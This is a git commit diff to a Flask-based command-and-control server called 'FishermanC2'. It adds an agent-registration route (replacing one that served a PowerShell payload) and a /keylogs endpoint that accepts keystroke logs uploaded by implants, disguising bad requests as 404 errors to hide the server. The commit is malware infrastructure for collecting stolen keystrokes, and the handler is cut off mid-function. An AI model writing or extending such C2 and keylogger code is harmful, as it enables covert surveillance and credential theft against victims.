54cf0404596d1b959fd80d949a5f9e002dab9e7e
Orad Segal <124451776+7Pawns@users.noreply.github.com>
2024-03-28 22:03:59 +0200

    DB and more routes

--- routes/main.py
+++ routes/main.py
@@ -1,6 +1,10 @@
-from flask import Flask, send_file, request
+from flask import Flask, send_file, request, abort
+from db.db import HookDB
 
 app = Flask(__name__)
+hooksDB = HookDB()
+
+HIDE_PAGE_MESSAGE = (404, 'Page not found')
 
 
 @app.route('/')
@@ -8,9 +12,9 @@ def index():
     return 'FishermanC2'
 
 
-@app.route('/hook')  # TODO: change payload to the cpp agent
+@app.route('/hook')
 def hook():
-    return send_file("D:/Reel/test_payload.ps1", as_attachment=True)
+    return str(hooksDB.register_hook())
 
 
 @app.route('/<agentId>/status', methods=['GET'])
@@ -22,3 +26,14 @@ def keeper(agentId):
         app.logger.error('%s is having issues', agentId)
 
     return 'ok'
+
+
+@app.route('/keylogs', methods=['POST'])
+def keylogger():
+    if 'file' not in request.files:
+        abort(404)
+    chunked_keylog = request.files['file']
+    try:
+        serial_number = int(chunked_keylog.filename)
+    except Exception as e:
+        abort(*HIDE_PAGE_MESSAGE)
